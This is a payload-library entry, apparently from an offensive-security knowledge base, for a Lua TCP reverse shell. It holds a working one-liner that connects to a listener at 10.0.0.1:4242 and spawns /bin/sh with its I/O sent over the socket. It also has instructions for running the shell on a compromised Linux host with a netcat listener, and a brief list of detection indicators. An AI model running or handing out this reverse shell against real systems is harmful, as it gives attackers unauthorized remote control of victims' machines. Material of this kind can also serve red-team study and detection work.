---
id: 6e07e01a-3b59-4102-be7a-1f11a391b7b9
type: code
language: lua
verified: true
created_at: '2023-04-06T03:56:24.651775+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - reverse-shell
  - lua
  - payload
platforms:
  - Linux
validated: true
---

# Lua-Basic-TCP-Reverse-Shell

## Code

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

## Description

This Lua one-liner creates a basic TCP reverse shell by requiring the socket and os libraries, establishing a connection to a listener, and executing a shell with I/O redirected to the socket. It provides quick remote access but is non-interactive after initial connection.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| IP Address | Target listener IP (hardcoded as '10.0.0.1') | 192.168.1.100 |
| Port | Listener port (hardcoded as '4242') | 4444 |

## Usage

Execute this on a compromised Linux target with Lua and LuaSocket installed, after starting a netcat listener (e.g., nc -lvnp 4242) on the attacker machine. Manually replace the IP and port in the script before running. Used in post-exploitation for initial shell access.

## Detection

- Monitor for lua process spawning with -e flag and socket requires.
- Network logs showing outbound TCP to attacker IPs on high ports.
- Shell redirection patterns in process arguments (/bin/sh -i <&3).

## Related

- [[procedures/Implement-Lua-Reverse-Shell]]
